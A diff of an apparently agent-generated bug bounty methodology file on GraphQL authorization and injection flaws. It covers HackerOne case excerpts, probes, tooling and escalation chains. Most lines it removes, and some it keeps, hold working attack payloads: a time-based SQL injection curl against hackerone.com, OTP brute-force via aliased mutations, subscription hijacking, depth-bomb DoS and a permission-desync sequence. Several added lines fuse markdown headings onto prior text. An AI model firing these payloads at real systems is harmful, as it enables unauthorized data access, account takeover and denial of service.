@@ -4,13 +4,13 @@ description: "Use for GraphQL endpoints: introspection, field-level authorizatio
 agent_created: true
 ---
 
-# GraphQL Authorization and Injection Flaws — unified skill
+# GraphQL Authorization and Injection Flaws — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 13 valid HackerOne reports (2 paid / 15%)
+## Corpus signal — 13 valid reports (2 paid / 15%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,71 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | employee / developer public info | 1 |
 | intercept & replay request in Burp | 1 |
 | Content-Type / body-format switch | 1 |
-| header injection (Host / X-Forwarded / etc.) | 1 |
-| encoding / double-encode / null byte | 1 |
-| cache / CDN / unkeyed header | 1 |
-
-### Parameters observed in writeups
-
-`z2lkoi8vagfja2vyb25ll1rlyw0vmtm` (1)
-
-### Bypass primitives observed
-
-`race condition` (2), `bypass` (1), `bypassing` (1), `content-type` (1), `time based` (1)
-
-### Impact language observed
-
-`password` (19), `token` (9), `admin` (6), `sensitive data` (3), `unauthorised` (3), `unauthorized` (2), `sensitive information` (2), `localhost` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [1618347](https://hackerone.com/reports/1618347) — Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`
-
-HackerOne · $25000 · critical
-
-**Summary:** Hi team, I understand what's going on **Description:** Just a recent update gives the results of private programs ### Steps To Reproduce Without authorization GraphQL: `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}` Answer: `{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}` This is Asset program - █████████ Thanks! ## Impact Disclosing Sсope(Assets) in Private Programs
-
-#### [707406](https://hackerone.com/reports/707406) — Team object in GraphQL disclosed of private programs via the industry
-
-HackerOne · $500 · low
-
-**Summary:** Disclosure of private programs across the industry If the program is private, it will show industriy ### Steps To Reproduce {"query": "query {team(handle:\\"█████████\\"){_id,industry}}"} `{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}` {"query": "query {team(handle:\\"█████████\\"){_id,industry}}"} `{"data":{"team":{"_id":"████████","industry":"Computer Software"}}}` {"query": "query {team(handle:\\"███\\"){_id,industry}}"} `{"data":{"team":{"_id":"████","industry":null}}}` ## Impact Disclosure of private programs
-
-#### [3287208](https://hackerone.com/reports/3287208) — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API
-
-HackerOne · no bounty — still valid · severity n/a
-
-**Summary:** The GraphQL API’s `verifyAccountRecoveryPhoneNumber` mutation can be aliased multiple times in a single request, causing the server to process each mutation sequentially. Each additional alias adds approximately 8 seconds to the server’s response time, enabling (DoS) attack by exhausting server resources and increasing latency. **Description:** The `verifyAccountRecoveryPhoneNumber` mutation is designed to verify user phone numbers during account recovery phone change. However, the API does not limit the number of mutation aliases in a single GraphQL request. When the same mutation is repeated with different aliases, the server executes each one separately, performing expensive backend operations multiple times. This leads to a linear increase in response time based on the number of aliases included. The result is a resource exhaustion vulnerability that can degrade or deny service availability to legitimate users. ### Steps To Reproduce 1. Prepare a GraphQL mutation request with multiple aliases for `verifyAccountRecoveryPhoneNumber`, In this case, the response time will exceed 20 seconds because each alias (verify1, verify2, verify3) adds approximately 8 seconds of processing time. 2. Send the request to the GraphQL endpoint with valid or dummy `verification_code` and `otp_code` variables. 3. Observe the response time increases by 8 seconds for each additional mu
-
-#### [898528](https://hackerone.com/reports/898528) — GraphQL AdminGenerateSessionPayload is leaked to staff with no permission
-
-Shopify · no bounty — still valid · medium
-
-@hiffley reported the ability to generate app tokens via the adminGenerateSession mutation in Shopify Admin, as a staff member with no permissions. This allowed for accessing a small subset of installed apps that are using this new flow (including Shopify Email). Access was limited to the current shop. We fixed this by adding a check for Apps permission to this mutation. This is a limited disclosure at the request of @hiffley. POC request:
-
-#### [2357012](https://hackerone.com/reports/2357012) — Inadequate redaction exposes sensitive information via the “ShareReportViaEmail" GraphQL endpoint
-
-HackerOne · no bounty — still valid · medium
-
-## Summary The vulnerability involves the insufficient redaction of sensitive information within the HackerOne platform. Specifically, the redaction feature, designed to conceal certain data such as JIRA references, fails to completely obscure this information from being accessed through GraphQL requests. ## Steps to Reproduce 1. Execute the following GraphQL request: 2. Observe the response, which includes the redacted `impact` field. ## Impact The impact of this vulnerability is significant as it undermines the confidentiality measures put in place by the redaction feature. An attacker or unauthorized user could potentially exploit this vulnerability to gain access to sensitive information which might include critical data. ███████
-
-#### [3287208](https://hackerone.com/reports/3287208) — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API
-
-HackerOne · no bounty — still valid · severity n/a
-
-**Summary:** The GraphQL API’s `verifyAccountRecoveryPhoneNumber` mutation can be aliased multiple times in a single request, causing the server to process each mutation sequentially. Each additional alias adds approximately 8 seconds to the server’s response time, enabling (DoS) attack by exhausting server resources and increasing latency. **Description:** The `verifyAccountRecoveryPhoneNumber` mutation is designed to verify user phone numbers during account recovery phone change. However, the API does not limit the number of mutation aliases in a single GraphQL request. When the same mutation is repeated with different aliases, the server executes each one separately, performing expensive backend operations multiple times. This leads to a linear increase in response time based on the number of aliases included. The result is a resource exhaustion vulnerability that can degrade or deny service availability to legitimate users. ### Steps To Reproduce 1. Prepare a GraphQL mutation request with multiple aliases for `verifyAccountRecoveryPhoneNumber`, In this case, the response time will exceed 20 seconds because each alias (verify1, verify2, verify3) adds approximately 8 seconds of processing time. 2. Send the request to the GraphQL endpoint with valid or dummy `verification_code` and `otp_code` variables. 3. Observe the response time increases by 8 seconds for each additional mu
-
-#### [898528](https://hackerone.com/reports/898528) — GraphQL AdminGenerateSessionPayload is leaked to staff with no permission
-
-Shopify · no bounty — still valid · medium
-
-@hiffley reported the ability to generate app tokens via the adminGenerateSession mutation in Shopify Admin, as a staff member with no permissions. This allowed for accessing a small subset of installed apps that are using this new flow (including Shopify Email). Access was limited to the current shop. We fixed this by adding a check for Apps permission to this mutation. This is a limited disclosure at the request of @hiffley. POC request:
-
-### Recurring approach patterns from real reports
-
-- 1× when clicking on change password after supplying values for current password password and confirm password user is directed to sign in page to log in again with changed password
-- 1× i ve found a misconfiguration in your graphql api on the endpoint in which an attacker is able to run a graphql interospection query to fetch schemas types fields available query operations after running interospection query on the graphql api endpoint an attacker is able to list all type of available api calls so he ll be able to perform unauthorised api calls due to this misconfiguration
-- 1× impact an attacker can exploit this vulnerability to cause a denial of service dos by sending a single graphql request with multiple aliases of the expensive mutation
 
 ## Corpus-backed method (this class)
 
@@ -121,18 +56,13 @@ Shopify · no bounty — still valid · medium
 - Introspection -> hidden mutation -> authz bypass -> PII.
 - Batching -> rate-limit bypass -> OTP brute force.
 
-### Probes
-
-- __schema query, __typename error reconstruction, aliased repeated fields, nested ID arguments, batch arrays.
-
 ### Veteran tip
 
 The operator's thredup notes show schema reconstruction via validation errors even with introspection disabled.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -201,10 +131,7 @@ Start here. These are the highest-yield tests for this class.
 - Enumerate **subscriptions** as a separate authz surface (WSS endpoint, `subscription { ... }`). Resolver authorization on queries/mutations is often not applied to subscription setup, yielding a live stream of another tenant's events.
 - Check **multipart file-upload GraphQL** endpoints (`operations`, `map`, file parts). The `map` object controls which variable receives the file — a classic place for cross-field injection and IDOR on attachment IDs.
 - Note whether **persisted queries / trusted documents** are used (a hash or ID instead of a query string). These block arbitrary introspection but can be abused if hashes are guessable or if one trusted document contains an IDOR-shaped query with attacker-controlled variables.
-- Track the **operation-limit** features the deployment should have (max aliases, max root fields, max bytes, max depth, max batch size). Testing each one individually tells you which DoS/brute-force primitive remains available — and gives concrete remediation language for the report.
-
-### Signals and surfaces
-
+- Track the **operation-limit** features the deployment should have (max aliases, max root fields, max bytes, max depth, max batch size). Testing each one individually tells you which DoS/brute-force primitive remains available — and gives concrete remediation language for the report.### Signals and surfaces
 ### Signal
 
 - Reports: **79** · paid: **28**
@@ -290,10 +217,7 @@ X-Request-Id + no REST-style path params = likely GraphQL
 - Wayback Machine for `/graphql` paths
 - JS bundle scanning with `LinkFinder` or `getallurls`
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Payloads & probes
 
 - Introspection -> `{__schema{types{name fields{name}}}}`
@@ -571,10 +495,7 @@ fragment F on User { repos { teams { members { ...F } } } }
 
 **Defense: Operation whitelisting (persisted queries)**
 - Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
-- Look for a non-whitelisted endpoint (dev, staging, internal proxy)
-
-### Validation and proof
-
+- Look for a non-whitelisted endpoint (dev, staging, internal proxy)### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -613,10 +534,7 @@ fragment F on User { repos { teams { members { ...F } } } }
 - For CSRF, you must demonstrate a real cross-site state change with the victim's session — not merely that GET is accepted. Confirm SameSite and content-type enforcement; a JSON-POST-only endpoint with correct preflight rejection is not vulnerable.
 - Mutation authz: use two accounts (attacker A, victim B) and show A's token executing a mutation on B's object. A mutation that only returns an error message difference is an enumeration clue, not a finding (unless sensitive PII is exposed).
 - Do not report a "hidden field" discovered only via introspection if the resolver rejects unauthorized access — resolver-level authorization is what matters; schema visibility is not an authorization boundary.
-- Record exact query text, variables, endpoint path, and method in the report — GraphQL requests are not self-describing in a screenshot, and triagers must be able to replay the alias/batch exactly.
-
-### Escalation and related chains
-
+- Record exact query text, variables, endpoint path, and method in the report — GraphQL requests are not self-describing in a screenshot, and triagers must be able to replay the alias/batch exactly.### Escalation and related chains
 ### Escalation chains
 
 - GraphQL IDOR -> PII.
@@ -639,10 +557,7 @@ fragment F on User { repos { teams { members { ...F } } } }
 - **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
 - **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
 - **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
-- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.
-
-### Tools and wordlists
-
+- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.### Tools
 ### Tools
 
 `graphql-voyager` · `InQL` · `GraphQLmap` · `clairvoyance`
@@ -680,10 +595,7 @@ nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Real-world examples
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Real-world examples
 ### Real Impact Examples
 
 **Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
@@ -695,10 +607,7 @@ An attacker with admin access initiates a repository transfer to another organiz
 **Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
 On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -735,10 +644,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class grap
 5. https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/99-GraphQL/
 6. https://afine.com/graphql-security-from-a-pentesters-perspective
 7. https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints
-8. https://github.com/PortSwigger/inql
-
-### Additional notes
-
+8. https://github.com/PortSwigger/inql### Additional notes
 ### Parameters observed
 
 `operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`
@@ -844,375 +750,8 @@ A common claim is "alias batching defeats per-user rate limits and double-spend 
 
 **Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# Graphql — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- Introspection -> `{__schema{types{name fields{name}}}}`
-
-- Alias abuse -> `{a:login(u:"a") b:login(u:"b")}`
-
-- Mass assignment -> `mutation{updateUser(role:"admin"){id}}`
-
-- Injection -> `filter: "{\"$where\":\"...\"}"`
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 7× | `$where` |
-
-| 2× | `\\| Decoded` |
-
-| 2× | `{F_number_file}` |
-
-| 2× | `curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>` |
-
-| 1× | `sift(filter)` |
-
-| 1× | `In CSP mode, sift does not support strings in "$where" condition` |
-
-| 1× | `new Function("obj", "return " + myString)` |
-
-| 1× | `next()` |
-
-| 1× | `curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \ / --data-raw '{"query":"{me{_id username}}"}' \\| jq` |
-
-| 1× | `(empty) \\| HTTP 500 /` |
-
-| 1× | `edges { cursor node { id } }` |
-
-| 1× | `source: "doc[\"_seq_no\"].value` |
-
-| 1× | `sort_query: '[{"id":"asc"}]` |
-
-| 1× | `doc[\"_seq_no\"].value` |
-
-| 1× | `doc['<field>'].value` |
-
-| 1× | `curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
-
-| 1× | `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
-
-| 1× | `{"data":{"team":{"_id":"██████████","report_sources":[]}}}` |
-
-| 1× | `{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` |
-
-| 1× | `{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` |
-
-
-
-## Parameters observed
-
-
-
-`operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_graphql.txt` | 64 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_graphql.txt` | 14 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_graphql.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_graphql.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Run introspection and authz tests by hand; templates mostly fingerprint servers and known CVEs.
-
-
-
-```sh
-
-nuclei -u https://target -tags graphql \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_graphql.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/technologies/graphql \
-
-       -rl 40 -o nuclei_graphql_graphql.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
-
-       -rl 40 -o nuclei_graphql_other.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-
-
-## Payload & Detection Patterns
-
-
-
-**Full Introspection Query:**
-
-```graphql
-
-{
-
-  __schema {
-
-    types {
-
-      name
-
-      fields {
-
-        name
-
-        type {
-
-          name
-
-          kind
-
-        }
-
-      }
-
-    }
-
-  }
-
-}
-
-```
-
-
-
-**Minimal Introspection Probe (bypass attempt):**
-
-```graphql
-
-{ __typename }
-
-```
-
-
-
-**curl introspection test:**
-
-```bash
-
-curl -s -X POST https://target.com/graphql \
-
-  -H "Content-Type: application/json" \
-
-  -H "Authorization: Bearer YOUR_TOKEN" \
-
-  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
-
-```
-
-
-
-**Field suggestion probe (bypass blind introspection blocks):**
-
-```graphql
-
-{ unknownField }
-
-```
-
-If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.
-
-
-
-**Batch query amplification:**
-
-```json
-
-[
-
-  {"query": "{ user(id: 1) { email } }"},
-
-  {"query": "{ user(id: 2) { email } }"},
-
-  {"query": "{ user(id: 3) { email } }"}
-
-]
-
-```
-
-
-
-**Subscription hijacking (cross-user channel access):**
-
-```graphql
-
-subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
-
-```
-
-If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.
-
-
-
-**Multi-code OTP/2FA brute-force via alias batching:**
-
-```graphql
-
-mutation { 
-
-  v1: verifyOtp(code:"000001"){token} 
-
-  v2: verifyOtp(code:"000002"){token}
-
-  v3: verifyOtp(code:"000003"){token}
-
-}
-
-```
-
-A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.
-
-
-
-**RC desync test pattern (pseudo-sequence):**
-
-```bash
-
-# Step 1: Grant access via REST
-
-curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
-
-  -H "Authorization: token ADMIN_TOKEN" \
-
-  -d '{"permission":"admin"}'
-
-
-
-# Step 2: Revoke via REST  
-
-curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
-
-  -H "Authorization: token ADMIN_TOKEN"
-
-
-
-# Step 3: Re-assert via GraphQL mutation
-
-curl -X POST https://api.target.com/graphql \
-
-  -H "Authorization: bearer ATTACKER_TOKEN" \
-
-  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'
-
-
-
-# Step 4: Verify persistent access
-
-curl https://api.target.com/repos/ORG/REPO/teams \
-
-  -H "Authorization: token ADMIN_TOKEN"
-
-```
-
-
-
-**Grep for GraphQL in JS bundles:**
-
-```bash
-
-grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
-
-grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
-
-```
-
-
-
-**GraphQL introspection & audit tooling:**
-
-```bash
-
-# InQL (Burp extension) — visualize GraphQL schema and relationships
-
-inql -t https://target/graphql --generate-queries
-
-
-
-# Clairvoyance — brute-force field names when introspection is disabled
-
-python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json
-
-
-
-# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
-
-graphql-cop -t https://target/graphql
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # Graphql — Combined Field Guide — Technique reference
 
@@ -1574,108 +1113,13 @@ A common claim is "alias batching defeats per-user rate limits and double-spend 
 
 
 
----
+---## Probes
 
-## Corpus wordlists (mined)
+- __schema query, __typename error reconstruction, aliased repeated fields, nested ID arguments, batch arrays.
 
-### `params_graphql.txt`
+## Supporting data
 
-```text
-operation
-ssl
-type
-embedded_submission_form_uuid
-variables
-document_type
-name
-sentry_key
-access_level
-core_hacker_username
-core_team_handle
-query
-sort
-page
-```
-
-### `paths_graphql.txt`
-
-```text
-/graphql
-/admin/internal/web/graphql/core
-/admin/api/graphql
-/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers
-/api/graphql
-/-/graphql-explorer
-/taskcluster
-/api/secrets/v1
-/i/lists/[ID
-/access_account/invoice/
-/store/
-/api/shopify/
-/api/shopify/███
-/api/shopify/██████
-/api/graphql/
-/apps/graphiql
-/secret-group-213
-/rpadovani
-/users/rpadovani/contributed
-/api/v4/namespaces/16048
-/docs/technotes/TN0021-graph-security/
-/graphql/playground
-/federal/graphql
-/en-in/graphql
-/cgi-bin/cvename.cgi
-/api/30/csp-report/
-/api/v4/user
-/api/v4/projects//members
-/admin/api/xauth
-/StaffMember
-/admin/api/unversioned/graphql
-/admin/apps/pos
-/shopify-pos
-/shopify
-/admin/apps/pos/staff/61357948984
-/payments/%3fsomething%26.json
-/payments
-/payments/
-/payments/1.json
-/payments/something
-/payments/1
-/users/api
-/api/unstable/graphql.json
-/api/usage/bulk-operations/queries
-/admin/apps/shopify-graphiql-app
-/en/api/graphql-admin-api/call-limit
-/-/graphiql-explorer
-/api/internal/graphql/requestAuthEmail
-/regex-explosive-quantifiers.html
-/en/api/graphql-admin-api/reference/queryroot
-/username
-/admin/settings/channels
-/admin/settings/checkout
-/admin/settings/shipping
-/admin/settings/gift_cards
-/admin/settings/taxes
-/admin
-/admin/settings/general
-/admin/settings/files
-/admin/settings/payments
-/admin/settings/account
-/csp-report
-/admin/settings/notifications
-/xss-report
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-graphql`
-- `hunting` — `graphql`
-- `cbh` — `hunt-graphql`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
